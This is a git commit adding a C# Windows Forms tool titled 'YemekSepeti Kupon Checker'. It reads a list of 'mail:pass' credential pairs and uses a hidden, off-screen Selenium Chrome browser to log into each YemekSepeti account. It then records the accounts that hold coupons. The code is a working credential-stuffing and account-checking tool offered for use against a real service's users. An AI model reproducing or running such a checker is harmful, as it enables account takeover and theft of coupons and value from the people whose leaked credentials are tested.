3a56ae265c694909e47d622306dbcfef797ecb7f
Eren <eren.bicakci2003@gmail.com>
2022-04-14 02:56:32 +0300

    erenbic

---
+++ YemekSepetiKuponKontrol/YemekSepetiKuponKontrol/Form1.Designer.cs
@@ -0,0 +1,163 @@
+﻿namespace YemekSepetiKuponKontrol
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(12, 164);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(360, 394);
+            this.richTextBox1.TabIndex = 0;
+            this.richTextBox1.Text = "";
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Segoe UI", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button1.Location = new System.Drawing.Point(392, 380);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(155, 58);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Check";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label1.Location = new System.Drawing.Point(203, 41);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(555, 57);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "YemekSepeti Kupon Checker";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label2.Location = new System.Drawing.Point(12, 126);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(117, 35);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "mail:pass";
+            // 
+            // richTextBox2
+            // 
+            this.richTextBox2.Location = new System.Drawing.Point(565, 164);
+            this.richTextBox2.Name = "richTextBox2";
+            this.richTextBox2.Size = new System.Drawing.Size(365, 394);
+            this.richTextBox2.TabIndex = 4;
+            this.richTextBox2.Text = "";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Segoe UI", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label3.Location = new System.Drawing.Point(565, 126);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(213, 35);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Kuponlu Hesaplar";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label4.Location = new System.Drawing.Point(800, 9);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(138, 20);
+            this.label4.TabIndex = 6;
+            this.label4.Text = "BicakciSoft™ 2022";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(452, 304);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(0, 20);
+            this.label5.TabIndex = 8;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label6.Location = new System.Drawing.Point(897, 29);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(41, 20);
+            this.label6.TabIndex = 9;
+            this.label6.Text = "V1.2";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(938, 570);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.richTextBox2);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.richTextBox1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "YemekSepeti Kupon Checker";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.RichTextBox richTextBox2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label6;
+    }
+}
---
+++ YemekSepetiKuponKontrol/YemekSepetiKuponKontrol/Form1.cs
@@ -0,0 +1,98 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace YemekSepetiKuponKontrol
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        string email = "";
+        string sifre = "";
+        int kacinci = 1;
+        
+        private void button1_Click(object sender, EventArgs e)
+        {
+           
+            foreach (var item in richTextBox1.Lines)
+            {
+                button1.Enabled = false;
+                label5.Text = kacinci + "/" + richTextBox1.Lines.Count().ToString();
+                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
+                service.HideCommandPromptWindow = true;
+                var options = new ChromeOptions();
+                options.AddArgument("--window-position=-32000,-32000");
+                options.AddArgument("--disable-gpu");
+                options.AddArgument("--window-size=1920x1080");
+                options.AddUserProfilePreference("profile.managed_default_content_settings.images", 2);
+                var driver = new ChromeDriver(service, options);
+                driver.Navigate().GoToUrl("https://www.yemeksepeti.com/sakarya");
+                //IJavaScriptExecutor js = (IJavaScriptExecutor)driver;  YORUM SATIRI OLAN TÜM KISIMLAR HEAD DOSYASINI SİLEN JAVASCRIPT KOMUTLARI UYGULAMAYI BUGA SOKTUGU İCİN KULLANMIYORUM
+                //js.ExecuteAsyncScript("(function(){document.head.parentNode.removeChild(document.head);})()");
+                IWebElement username = driver.FindElement(By.Id("UserName"));
+                IWebElement password = driver.FindElement(By.Id("password"));
+                for (int i = 0; i < item.Length; i++)
+                {
+                    if(item.Substring(i, 1) == ":")
+                    {
+                        email = item.Substring(0, i);
+                        sifre = item.Substring(i+1,item.Length-i-1);
+                        break;
+                    }
+                }           
+                username.SendKeys(email);
+                password.SendKeys(sifre);
+                IWebElement girisbtn = driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div/div[1]/div[1]/button"));
+                girisbtn.Click();
+                //js.ExecuteAsyncScript("(function(){document.head.parentNode.removeChild(document.head);})()");
+                for (; ; )
+                {
+                    try
+                    {
+                        IWebElement girisTest = driver.FindElement(By.Id("ysUserName"));
+                        break;
+                    }
+                    catch
+                    {
+
+                    }
+                }              
+                try
+                {
+                    IWebElement kupon = driver.FindElement(By.ClassName("couponCode"));
+                    if (Convert.ToInt16(kupon.Text) > 0)
+                    {
+                        richTextBox2.Text += email + ":" + sifre + " " + kupon.Text + "\n";
+                    }
+                }
+                catch
+                {
+                }
+                driver.Quit();
+                
+                
+               
+                kacinci++;
+            }
+            button1.Enabled = true;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
